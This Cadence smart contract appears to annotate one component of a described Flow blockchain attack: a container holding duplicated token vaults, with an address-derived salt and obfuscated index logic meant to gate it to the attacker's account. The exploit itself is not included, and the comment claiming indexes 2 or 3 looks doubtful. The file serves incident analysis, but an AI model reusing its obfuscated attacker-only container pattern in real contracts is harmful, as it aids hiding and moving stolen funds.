import "FungibleToken"

/**
 * HotspotNFT.cdc - Token container contract for the December 27, 2025 Flow attack
 * 
 * This contract provides the Hotspot resource which serves as a container for
 * FungibleToken.Vault resources. In the attack, these Hotspots held the duplicated
 * token vaults (FLOW, USDT, WBTC, etc.) that were created via the type confusion exploit.
 * 
 * The attack duplicated 87.96 billion units of each targeted token by exploiting
 * Cadence's type system to COPY resources that should only be MOVABLE.
 * 
 * See: https://flow.com/post/dec-27-technical-post-mortem
 */
access(all) contract HotspotNFT {

    /**
     * Salt - Address-based authorization (same pattern as NFTFactory)
     * 
     * Computed from deploying account's address to create a unique fingerprint.
     * Uses a DIFFERENT multiplier (0x6fb64c0ce08a525) than NFTFactory to generate
     * a distinct salt value, but serves the same purpose: authorization.
     */
    access(all) var salt: UInt
    access(all) let nftMetadata: {UInt: UInt}

    /**
     * Hotspot Resource - Container for stolen token vaults
     * 
     * This resource holds an array of FungibleToken.Vault resources.
     * In the attack:
     * 1. The attacker obtained small amounts of each target token (FLOW, USDT, etc.)
     * 2. Used the type confusion exploit to DUPLICATE these vaults
     * 3. Duplicated 42 times in sequence, resulting in amounts that are multiples of 2^42
     *    (4,398,046,511,104 base units per token)
     * 4. Stored the duplicated vaults in Hotspot resources
     * 
     * The vaults could then be withdrawn and deposited to exchanges for liquidation.
     */
    access(all) resource Hotspot {
        access(all) var vaults: @[{FungibleToken.Vault}]

        access(all) fun withdraw(): @{FungibleToken.Vault} {
            return <- self.vaults.removeFirst()
        }

        access(all) fun deposit(vault: @{FungibleToken.Vault}) {
            self.vaults.append(<- vault)
        }

        init(value: UInt) {
            self.vaults <- []
        }
    }

    /**
     * mintHotspot - Creates a new Hotspot with obfuscated index calculation
     * 
     * OBFUSCATION ANALYSIS:
     * - key = 0x7ec8f8742628c6c9 (magic constant, different from NFTFactory)
     * - The XOR chain: (salt ^ key ^ 0xffffffffffffffff)
     *   - XOR with 0xffffffffffffffff flips all bits (bitwise NOT)
     *   - Combined with salt creates an account-specific value
     * - Adding 1 and >> 64:
     *   - For 64-bit values, shifting right by 64 gives 0 unless there's overflow
     *   - The +1 can cause overflow in specific cases, yielding index 1, 2, or 3
     * 
     * The index selects from nftMetadata, which contains seemingly random hex values.
     * These may be:
     * - Additional obfuscation to confuse analysis
     * - Configuration values for different attack scenarios
     * - Seeds for further calculations elsewhere in the attack chain
     * 
     * The math ensures different behavior based on which account deployed the contract.
     */
    access(all) fun mintHotspot(): @Hotspot {
        let key: UInt = 0x7ec8f8742628c6c9
        let index = (((self.salt ^ key ^ 0xffffffffffffffff) + 1) >> 64)
        return <- create Hotspot(value: self.nftMetadata[index]!)
    }

    access(all) fun burnHotspot(hotspot: @Hotspot) {
        destroy hotspot
    }

    /**
     * NFT Resource - Wrapper for Hotspot with swap-based withdrawal
     * 
     * The withdrawHotspot function uses Cadence's swap operator (<->):
     * 1. Mints a fresh (empty) Hotspot
     * 2. Swaps it with the stored hotspot
     * 3. Returns the original (full) hotspot
     * 
     * This pattern allows extracting the hotspot while maintaining valid state.
     */
    access(all) resource NFT {
        access(all) var hotspot: @Hotspot

        access(all) fun withdrawHotspot(): @Hotspot {
            var tempHotspot <- HotspotNFT.mintHotspot()
            self.hotspot <-> tempHotspot
            return <- tempHotspot
        }

        init(hotspot: @Hotspot) {
            self.hotspot <- hotspot
        }
    }

    access(all) fun createNFT(hotspot: @Hotspot): @NFT {
        return <- create NFT(hotspot: <- hotspot)
    }

    access(all) fun burnNFT(nft: @NFT) {
        destroy nft
    }

    /**
     * Contract initializer - Sets up address-based authorization
     * 
     * Similar to NFTFactory but with DIFFERENT magic multiplier (0x6fb64c0ce08a525).
     * 
     * nftMetadata values (0x35347ac7cac47a09, 0xa6c60934b5f161b1, 0x43c17dedd778cf72):
     * - Selected based on the index calculation in mintHotspot()
     * - Passed as 'value' parameter to Hotspot init (though not actually used there)
     * - Likely additional obfuscation or markers for different attack scenarios
     * 
     * The salt calculation:
     * salt = (address_as_uint * 0x6fb64c0ce08a525) & 0xffffffffffffffff
     * 
     * This creates a deterministic but hard-to-reverse mapping from address to salt,
     * ensuring only the attacker's account produces the expected values.
     */
    init() {
        self.nftMetadata = {
            1: 0x35347ac7cac47a09,
            2: 0xa6c60934b5f161b1,
            3: 0x43c17dedd778cf72
        }
        // ADDRESS-BASED AUTHORIZATION: Different multiplier than NFTFactory
        self.salt = (UInt.fromBigEndianBytes(self.account.address.toBytes())! * 0x6fb64c0ce08a525) & 0xffffffffffffffff
    }
}
